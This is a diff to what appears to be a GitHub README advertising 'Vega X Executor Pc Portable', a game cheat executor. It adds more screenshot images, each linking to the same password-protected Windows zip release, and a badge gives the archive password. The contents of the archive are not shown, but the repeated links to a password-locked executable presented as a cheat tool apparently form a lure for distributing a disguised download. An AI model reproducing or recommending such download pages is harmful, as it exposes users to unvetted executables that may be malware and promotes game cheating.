@@ -22,7 +22,9 @@
 
 <a href="https://github.com/bonnet66/vega-x-executor-pc-portable/releases/download/v1.2.2/vega-x-executor-pc-portable-v1.2.2-win64.zip"><img src="assets/download_btn.svg" alt="Download Vega X Executor Pc Portable" width="480"></a><br>
 <img src="assets/password_badge.svg" alt="Archive Password 2026" width="260"><br><br>
-<a href="https://github.com/bonnet66/vega-x-executor-pc-portable/releases/download/v1.2.2/vega-x-executor-pc-portable-v1.2.2-win64.zip"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAHlrY_hxk1OSO5abaoJ3CjHqv4JsDQN_HlVtE7nwAnxd2LYCUU5RI2meG&s=10" alt="Vega X Executor Pc Portable In-Game Menu & UI Screenshot" width="820"></a>
+<a href="https://github.com/bonnet66/vega-x-executor-pc-portable/releases/download/v1.2.2/vega-x-executor-pc-portable-v1.2.2-win64.zip"><img src="https://i.ytimg.com/vi/TuzXhj86PFg/maxresdefault.jpg" alt="Vega X Executor Pc Portable In-Game Menu & UI Screenshot" width="820"></a>
+<br>
+<a href="https://github.com/bonnet66/vega-x-executor-pc-portable/releases/download/v1.2.2/vega-x-executor-pc-portable-v1.2.2-win64.zip"><img src="https://i.ytimg.com/vi/YlTlZIwjx7g/maxresdefault.jpg" alt="Vega X Executor Pc Portable In-Game Menu & UI Screenshot" width="820"></a>
 
 </div>
 
